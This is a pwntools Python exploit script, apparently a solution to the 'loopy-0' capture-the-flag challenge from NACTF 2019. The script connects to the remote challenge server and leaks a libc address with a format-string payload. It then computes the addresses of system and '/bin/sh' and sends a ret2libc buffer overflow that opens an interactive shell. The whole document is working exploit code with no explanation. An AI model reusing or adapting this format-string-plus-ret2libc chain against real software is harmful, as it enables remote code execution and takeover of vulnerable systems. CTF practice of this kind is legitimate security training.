#!/usr/bin/env python

from pwn import *


libc = ELF('./libc.so.6')
e = ELF('./loopy-0')
#p = process('./loopy-0')
p = remote('shell.2019.nactf.com', 31283)



main = e.symbols['main']

#offsets
offset = 0x1dad80
libc_binsh = 0x17eaaa
libc_system = 0x0003ec00
ret = 0x0804900a

#Leak printf plt
payload = '%3$x'
payload+= 'A'*72
payload+= p32(main)	
p.recvuntil('Type something>')
p.sendline(payload)
p.recvuntil('You typed: ')
leak = int(p.recv(8), 16)

#Calculate libc_base
libc_base = leak - offset
log.info('libc_base: '+str(hex(libc_base)))

#get system and binsh
binsh = libc_binsh + libc_base
system = libc_system + libc_base

#craft payload
payload = ''
payload+= 'A'*76
payload+= p32(system)
payload+= p32(main)	
payload+= p32(binsh)
p.recv()
p.sendline(payload)
p.interactive()